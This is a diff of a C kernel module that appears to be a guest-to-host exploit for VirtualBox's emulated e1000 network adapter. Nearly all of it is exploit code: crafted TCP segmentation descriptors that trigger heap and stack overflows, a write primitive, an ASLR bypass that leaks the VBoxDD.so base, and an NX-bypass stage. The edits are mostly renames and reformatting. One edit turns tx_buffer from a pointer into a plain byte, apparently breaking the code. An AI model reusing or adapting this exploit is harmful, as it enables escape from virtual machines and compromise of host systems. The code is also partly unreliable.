@@ -31,13 +31,12 @@ static void e1k_configure(void);
 static void heap_overflow(uint16_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
 static uint64_t aslr_bypass(void);
-static void buffer_overflow(void);
+static void stack_overflow(void);
 static void nx_bypass(void);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
-uint8_t* bar0;
+uint8_t* bar0, tx_buffer;
 struct e1000_desc* tx_ring;
-uint8_t* tx_buffer;
 static int	idx = 0;
 uint16_t mu16Data[64] =
 {	0x0008, 0x1527, 0x2049, 0x0000, 0xffff, 0x0000, 0x0000, 0x0000,
@@ -60,8 +59,8 @@ static int __init e1k_init(void)
 		return -1;
 	}
 	e1k_configure();
-    //aslr_bypass();
-    //nx_bypass();
+	//aslr_bypass();
+	//nx_bypass();
 	
 	pr_info("Pwnd");
 	return 0;
@@ -83,9 +82,9 @@ module_exit(e1k_exit);
 static uint8_t* map_mmio(void)
 {
 	off_t phys_addr = 0xF0000000;
-	size_t len = 0x20000;
+	size_t length = 0x20000;
 
-	uint8_t* virt_addr = ioremap(phys_addr, len);
+	uint8_t* virt_addr = ioremap(phys_addr, length);
 	if (!virt_addr) {
 		pr_info("e1k : ioremap failed to map MMIO\n");
 		return NULL;
@@ -152,11 +151,11 @@ static void heap_overflow(uint16_t new_addr)
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
-	struct e1000_context_desc*	context_1	= &(tx_ring[idx+0].context);
-	struct e1000_data_desc*		data_2		= &(tx_ring[idx+1].data);
-	struct e1000_data_desc*		data_3		= &(tx_ring[idx+2].data);
-	struct e1000_context_desc*	context_4	= &(tx_ring[idx+3].context);
-	struct e1000_data_desc*		data_5		= &(tx_ring[idx+4].data);
+	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].context);
+	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
+	struct e1000_data_desc*	data_3 = &(tx_ring[idx+2].data);
+	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].context);
+	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
 	
@@ -186,27 +185,27 @@ static void heap_overflow(uint16_t new_addr)
 	//----------- Descriptors setup -----------//
 	physical_address = virt_to_phys(tx_buffer);
 
-	context_1->lower_setup.ip_config	= (uint32_t) 0;
-	context_1->upper_setup.tcp_config	= (uint32_t) 0;
-	context_1->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
-	context_1->tcp_seg_setup.data		= (uint32_t) (MSS_DEFAULT);
+	ctxt_1->lower_setup.ip_config	= (uint32_t) 0;
+	ctxt_1->upper_setup.tcp_config	= (uint32_t) 0;
+	ctxt_1->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
+	ctxt_1->tcp_seg_setup.data		= (uint32_t) (MSS_DEFAULT);
 
-	data_2->buffer_addr					= (uint64_t) physical_address;
-	data_2->lower.data					= (uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
-	data_2->upper.data					= (uint32_t) 0;
+	data_2->buffer_addr				= (uint64_t) physical_address;
+	data_2->lower.data				= (uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
+	data_2->upper.data				= (uint32_t) 0;
 
-	data_3->buffer_addr					= (uint64_t) physical_address;
-	data_3->lower.data					= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
-	data_3->upper.data					= (uint32_t) 0;
+	data_3->buffer_addr				= (uint64_t) physical_address;
+	data_3->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
+	data_3->upper.data				= (uint32_t) 0;
 
-	context_4->lower_setup.ip_config	= (uint32_t) 0;
-	context_4->upper_setup.tcp_config	= (uint32_t) 0;
-	context_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
-	context_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
+	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
+	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
+	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
+	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
 
-	data_5->buffer_addr					= (uint64_t) physical_address;
-	data_5->lower.data					= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
-	data_5->upper.data					= (uint32_t) 0;
+	data_5->buffer_addr				= (uint64_t) physical_address;
+	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
+	data_5->upper.data				= (uint32_t) 0;
 	//-----------------------------------------//
 
 	//--------- Fetch new descriptors ---------//
@@ -321,14 +320,16 @@ static void write_primitive(uint16_t address, uint16_t value)
 
 static uint64_t aslr_bypass(void)
 {
+	uint8_t leaked_bytes[8];
+	uint32_t rctl, i;
+	uint64_t leaked_vboxdd_ptr, vboxdd_base;
+
 	pr_info("##### Stage 1 #####\n");
 
 	// Set no loopback mode
-	uint32_t rctl = get_register(RCTL) | RCTL_LBM_NO;
+	rctl = get_register(RCTL) | RCTL_LBM_NO;
 	set_register(RCTL, rctl);
 
-	uint8_t leaked_bytes[8];
-	uint32_t i;
 	for (i = 0; i < 8; i++) {
 		write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
 		leaked_bytes[i] = inb(0x4107);
@@ -336,25 +337,25 @@ static uint64_t aslr_bypass(void)
 		pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
 	}
 
-	uint64_t leaked_vboxdd_ptr = *((uint64_t *) leaked_bytes);
-	uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
+	leaked_vboxdd_ptr	= *((uint64_t *) leaked_bytes);
+	vboxdd_base			= leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
 	pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
 	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 
 	return vboxdd_base;
 }
 
-static void buffer_overflow(void)
+static void stack_overflow(void)
 {
-	uint8_t* buffer;
+	uint8_t* 	buffer;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
-	struct e1000_context_desc*	context_1	= 	&(tx_ring[idx+0].context);
-	struct e1000_data_desc*		data_2		= 	&(tx_ring[idx+1].data);
-	struct e1000_data_desc*		data_3		= 	&(tx_ring[idx+2].data);
-	struct e1000_context_desc*	context_4	= 	&(tx_ring[idx+3].context);
-	struct e1000_data_desc*		data_5		= 	&(tx_ring[idx+4].data);
+	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].context);
+	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
+	struct e1000_data_desc*	data_3 = &(tx_ring[idx+2].data);
+	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].context);
+	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
 	buffer = kmalloc(STACK_LEN, GFP_KERNEL);
@@ -373,27 +374,27 @@ static void buffer_overflow(void)
 	
 	physical_address = virt_to_phys(buffer);
 
-	context_1->lower_setup.ip_config	= 	(uint32_t) 0;
-	context_1->upper_setup.tcp_config	= 	(uint32_t) 0;
-	context_1->cmd_and_length			= 	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
-	context_1->tcp_seg_setup.data		= 	(uint32_t) (MSS_DEFAULT);
+	ctxt_1->lower_setup.ip_config	= (uint32_t) 0;
+	ctxt_1->upper_setup.tcp_config	= (uint32_t) 0;
+	ctxt_1->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
+	ctxt_1->tcp_seg_setup.data		= (uint32_t) (MSS_DEFAULT);
 
-	data_2->buffer_addr					= 	(uint64_t) physical_address;
-	data_2->lower.data					= 	(uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
-	data_2->upper.data					= 	(uint32_t) 0;
+	data_2->buffer_addr				= (uint64_t) physical_address;
+	data_2->lower.data				= (uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
+	data_2->upper.data				= (uint32_t) 0;
 
-	data_3->buffer_addr					= 	(uint64_t) physical_address;
-	data_3->lower.data					= 	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
-	data_3->upper.data					= 	(uint32_t) 0;
+	data_3->buffer_addr				= (uint64_t) physical_address;
+	data_3->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
+	data_3->upper.data				= (uint32_t) 0;
 
-	context_4->lower_setup.ip_config	=	(uint32_t) 0;
-	context_4->upper_setup.tcp_config	=	(uint32_t) 0;
-	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | STACK_LEN);
-	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));
+	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
+	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
+	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | STACK_LEN);
+	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
 
-	data_5->buffer_addr					=	(uint64_t) physical_address;
-	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | STACK_LEN | TSE);
-	data_5->upper.data					= 	(uint32_t) 0;
+	data_5->buffer_addr				= (uint64_t) physical_address;
+	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | STACK_LEN | TSE);
+	data_5->upper.data				= (uint32_t) 0;
 	//-----------------------------------------//
 
 	//--------- Fetch new descriptors ---------//
@@ -405,13 +406,14 @@ static void buffer_overflow(void)
 
 static void nx_bypass(void)
 {
+	uint32_t rctl;
 	pr_info("##### Stage 2 #####\n");
 
 	// Set loopback mode
-	uint32_t rctl = get_register(RCTL);// | RCTL_LBM_MAC | RCTL_LBM_SLP;
+	rctl = get_register(RCTL);// | RCTL_LBM_MAC | RCTL_LBM_SLP;
 	set_register(RCTL, rctl);
 
-	//buffer_overflow();
+	//stack_overflow();
 
 	// Disable loopback mode
 	rctl = get_register(RCTL);// & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
